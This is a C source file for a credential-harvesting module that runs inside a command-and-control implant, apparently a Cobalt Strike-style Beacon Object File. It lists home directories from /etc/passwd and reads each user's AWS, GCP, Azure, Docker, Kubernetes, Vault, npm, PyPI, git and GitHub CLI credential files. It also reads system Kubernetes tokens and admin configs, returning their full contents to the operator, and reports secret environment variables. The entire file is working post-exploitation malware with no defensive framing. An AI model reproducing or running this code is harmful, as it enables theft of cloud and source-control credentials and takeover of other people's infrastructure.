/// cred_harvest.c — Harvest cloud/dev credentials (AWS/GCP/Azure/K8s/Docker/Git)
/// gcc -c -o cred_harvest.o cred_harvest.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

static void hdr(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 %s\n", s); }
static void sub(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x9c\xe2\x94\x80 %s\n", s); }
static void fin(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s); }
static void ln(const char *s)  { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %s\n", s); }

typedef struct { const char *sub; const char *desc; int show; } cfile_t;
static const cfile_t cfiles[] = {
    {".aws/credentials","AWS creds",1},{".aws/config","AWS config",1},
    {".config/gcloud/application_default_credentials.json","GCP ADC",1},
    {".config/gcloud/credentials.db","GCP creds DB",0},
    {".azure/accessTokens.json","Azure tokens",1},{".azure/msal_token_cache.json","Azure MSAL",1},
    {".docker/config.json","Docker auth",1},{".kube/config","K8s config",1},
    {".terraform.d/credentials.tfrc.json","Terraform token",1},{".vault-token","Vault token",1},
    {".npmrc","NPM auth",1},{".pypirc","PyPI creds",1},{".git-credentials","Git stored creds",1},
    {".netrc","netrc (APIs)",1},{".config/gh/hosts.yml","GitHub CLI",1},
    {".pulumi/credentials.json","Pulumi creds",1},{".ansible/vault_password","Ansible vault",1},
    {(const char*)0,(const char*)0,0}
};

static int g_found = 0;

static void scan_user(const char *home, const char *user) {
    int uf = 0;
    for (int i = 0; cfiles[i].sub; i++) {
        char fp[768]; AxSnprintf(fp, sizeof(fp), "%s/%s", home, cfiles[i].sub);
        unsigned int m=0; long fs=0;
        if (AxFileStat(fp,&m,&fs,(unsigned int*)0,(unsigned int*)0) != 0) continue;
        if (!uf) { char b[128]; AxSnprintf(b,sizeof(b),"%s (%s)",user,home); sub(b); uf=1; }
        if (cfiles[i].show && fs > 0 && fs < 65536) {
            char *d=(char*)0; int dl=AxReadFileToBuffer(fp,&d,65536);
            if (dl>0&&d) {
                char b[128]; AxSnprintf(b,sizeof(b),"[+] %s  %s (%ld B)",cfiles[i].desc,cfiles[i].sub,fs);
                ln(b);
                BeaconOutput(CALLBACK_OUTPUT, d, dl);
                if(d[dl-1]!='\n') BeaconOutput(CALLBACK_OUTPUT,"\n",1);
                AxFree(d); g_found++;
            }
        } else {
            char b[128]; AxSnprintf(b,sizeof(b),"%s  %s (%ld B)",cfiles[i].desc,cfiles[i].sub,fs);
            ln(b); g_found++;
        }
    }
}

static void check_env(void) {
    sub("Environment Secrets");
    const char *vars[] = {
        "AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS","AZURE_CLIENT_SECRET","VAULT_TOKEN",
        "GITHUB_TOKEN","GH_TOKEN","GITLAB_TOKEN","NPM_TOKEN",
        "DATABASE_URL","DB_PASSWORD","JWT_SECRET","SECRET_KEY","API_KEY",(const char*)0
    };
    int found = 0;
    for (int i = 0; vars[i]; i++) {
        char v[1024];
        if (AxGetEnv(vars[i], v, sizeof(v)) > 0) {
            int vl = AxStrlen(v);
            char b[256];
            if (vl > 8) AxSnprintf(b,sizeof(b),"[+] %s = %c%c%c%c...%c%c%c%c (%d chars)",
                vars[i],v[0],v[1],v[2],v[3],v[vl-4],v[vl-3],v[vl-2],v[vl-1],vl);
            else AxSnprintf(b,sizeof(b),"[+] %s = %s", vars[i], v);
            ln(b); found++; g_found++;
        }
    }
    if (!found) ln("[-] No secret env vars detected");
}

static void check_system(void) {
    sub("System Credentials");
    typedef struct { const char *p; const char *d; int show; } sc_t;
    static const sc_t sc[] = {
        {"/var/run/secrets/kubernetes.io/serviceaccount/token","K8s SA token",1},
        {"/etc/rancher/k3s/k3s.yaml","K3s kubeconfig",1},
        {"/etc/kubernetes/admin.conf","K8s admin",1},
        {"/root/.docker/config.json","Root Docker auth",1},
        {(const char*)0,(const char*)0,0}
    };
    int found=0;
    for (int i=0;sc[i].p;i++) {
        unsigned int m=0;long fs=0;
        if(AxFileStat(sc[i].p,&m,&fs,(unsigned int*)0,(unsigned int*)0)!=0) continue;
        char b[128]; AxSnprintf(b,sizeof(b),"[+] %s (%ld B) — %s",sc[i].p,fs,sc[i].d);
        ln(b); found++; g_found++;
        if(sc[i].show&&fs>0&&fs<65536){
            char *d=(char*)0;int dl=AxReadFileToBuffer(sc[i].p,&d,65536);
            if(dl>0&&d){BeaconOutput(CALLBACK_OUTPUT,d,dl);
            if(d[dl-1]!='\n')BeaconOutput(CALLBACK_OUTPUT,"\n",1);AxFree(d);}
        }
    }
    if(!found) ln("[-] No system credential files found");
}

void go(char *args, int args_len) {
    hdr("Credential Harvest");
    g_found = 0;
    char *pw=(char*)0;int pl=AxReadFileToBuffer("/etc/passwd",&pw,524288);
    if(pl>0&&pw){
        char *line=pw;
        while(line<pw+pl){
            char *eol=line;while(eol<pw+pl&&*eol!='\n')eol++;
            int f=0;char *un=line;int unl=0;char *hd=(char*)0;int hdl=0;char *fs=line;
            for(char *p=line;p<=eol;p++){
                if(p==eol||*p==':'){if(f==0){un=fs;unl=(int)(p-fs);}
                else if(f==5){hd=fs;hdl=(int)(p-fs);}f++;fs=p+1;}
            }
            if(hd&&hdl>1&&hdl<256){
                char hb[512],ub[256];AxMemcpy(hb,hd,hdl);hb[hdl]='\0';
                if(unl>255)unl=255;AxMemcpy(ub,un,unl);ub[unl]='\0';
                unsigned int m=0;
                if(AxFileStat(hb,&m,(long*)0,(unsigned int*)0,(unsigned int*)0)==0) scan_user(hb,ub);
            }
            line=eol+1;
        }
        AxFree(pw);
    }
    check_system();
    check_env();
    char s[48]; AxSnprintf(s,sizeof(s),"%d credential(s) found",g_found);
    fin(s);
}
